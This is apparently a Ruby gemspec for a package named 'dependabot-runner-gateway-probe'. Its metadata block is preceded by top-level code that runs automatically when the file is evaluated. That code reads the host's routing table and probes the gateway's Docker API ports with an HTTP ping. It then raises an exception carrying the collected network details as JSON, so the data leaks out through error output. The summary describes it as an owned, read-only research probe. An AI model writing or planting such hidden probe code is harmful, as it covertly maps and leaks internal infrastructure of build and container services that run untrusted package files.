require "json"
require "socket"
require "uri"

nonce = "20261012GWABA"

route_lines = File.readlines("/proc/net/route", chomp: true)
route = route_lines.drop(1).map { |line| line.split }.find do |fields|
  fields.length >= 4 && fields[1] == "00000000"
end

gateway = if route
  [route[2]].pack("H*").bytes.reverse.join(".")
end

def tcp_probe(host, port, send_http: false)
  result = { "host" => host, "port" => port, "connected" => false }
  Socket.tcp(host, port, connect_timeout: 2) do |socket|
    result["connected"] = true
    if send_http
      socket.write("GET /_ping HTTP/1.0\r\nHost: docker\r\nConnection: close\r\n\r\n")
      if IO.select([socket], nil, nil, 2)
        response = socket.readpartial(512)
        result["response_hex"] = response.unpack1("H*")
      else
        result["response_timeout"] = true
      end
    end
  end
  result
rescue => error
  result["error_class"] = error.class.name
  result["error_message"] = error.message
  result
end

results = {
  "nonce" => nonce,
  "route_lines" => route_lines,
  "gateway" => gateway,
  "docker_2375" => gateway ? tcp_probe(gateway, 2375, send_http: true) : nil,
  "docker_2376" => gateway ? tcp_probe(gateway, 2376) : nil,
  "negative_65534" => gateway ? tcp_probe(gateway, 65_534) : nil,
}

proxy_url = ENV["HTTPS_PROXY"] || ENV["https_proxy"] || ENV["HTTP_PROXY"] || ENV["http_proxy"]
if proxy_url
  proxy = URI(proxy_url)
  results["network_positive_control"] = tcp_probe(proxy.host, proxy.port)
end

raise "F005_GATEWAY_PROBE_#{results.to_json}"

Gem::Specification.new do |spec|
  spec.name = "dependabot-runner-gateway-probe"
  spec.version = "0.0.1"
  spec.summary = "Owned Dependabot bridge-gateway read-only probe"
  spec.authors = ["Mrunal Chawda"]
  spec.files = ["lib/dependabot_runner_gateway_probe.rb"]
  spec.require_paths = ["lib"]
end
